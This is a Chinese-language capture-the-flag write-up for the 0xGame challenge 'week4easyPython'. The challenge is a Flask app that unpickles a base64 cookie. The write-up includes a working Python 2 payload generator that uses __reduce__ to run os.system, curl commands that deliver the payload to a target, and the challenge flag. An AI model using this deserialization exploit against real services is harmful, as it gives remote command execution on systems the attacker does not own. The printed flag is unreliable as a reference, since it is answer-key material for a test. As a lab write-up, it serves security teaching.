# week4easyPython

## 题目简述

Flask 应用把名为 `Cookies` 的 Cookie 先做 Base64 解码，再直接交给 `pickle.loads()`。Python pickle 在反序列化时能够调用对象的 `__reduce__()` 所指定的函数，因此攻击者可以构造恶意对象，让服务端执行任意系统命令。容器使用 Python 2.7.9，flag 位于 `/flag`。

## 解题过程

首页的关键代码如下：

```python
usercookies = request.cookies.get('Cookies')
if not usercookies:
    usercookies = "{'username':'guest'}"
else:
    usercookies = pickle.loads(base64.b64decode(usercookies))
```

这里没有类型校验、签名或完整性保护。pickle 的 `REDUCE` 指令会取出一个可调用对象及其参数并执行调用；在 Python 类中，`__reduce__()` 正是用来提供这组“函数 + 参数”的接口。因此，若它返回 `(os.system, (command,))`，反序列化阶段就会运行 `command`。

Dockerfile 还给出了两个重要环境事实：基础镜像是 `python:2.7.9`，并通过 `COPY flag /flag` 把 flag 放在容器根目录。虽然 `models.py` 中存在 `admin / 123456`，登录成功也只会提示 `flag in /flag`；首页没有启用 `@login_required`，所以触发漏洞不需要先登录。

服务没有直接回显命令输出，但 Flask 默认会公开 `/app/static/` 为 `/static/`。可以把 flag 复制到静态目录，再通过第二个 HTTP 请求读取，完全不依赖公网回连平台：

```python
# make_payload.py：必须在 Linux 的 Python 2 环境运行
import base64
import os
import pickle


class RCE(object):
    def __reduce__(self):
        command = "cp /flag /app/static/recovered_flag.txt"
        return os.system, (command,)


payload = pickle.dumps(RCE(), protocol=0)
print base64.b64encode(payload)
```

生成和使用 payload：

```text
PAYLOAD=$(python2 make_payload.py)
curl -s --cookie "Cookies=${PAYLOAD}" "http://<TARGET>/"
curl -s "http://<TARGET>/static/recovered_flag.txt"
```

必须在 Linux 上生成，是因为同一个 `os.system` 在 Linux pickle 中记录为 `posix.system`，而 Windows 生成的数据会引用 `nt.system`，目标 Linux 容器无法导入后者。显式指定 `protocol=0` 则与题目的 Python 2.7 环境兼容，序列化流以可打印的文本 opcode 开头，而不是较新协议的二进制头。

仓库随题目提供的 `/flag` 内容为：

```text
0xGame{c794961c-20c3-43bb-9254-c111edceb1fa}
```

## 方法总结

利用链是“伪造 Base64 Cookie → `pickle.loads()` 解析 → `__reduce__`/`REDUCE` 调用 `posix.system` → 把 `/flag` 复制到 Flask 静态目录 → 再次请求读取”。原稿依赖外部回连服务和三张文字截图；这些信息已改写为正文，并用站内静态文件回显替代外部基础设施。
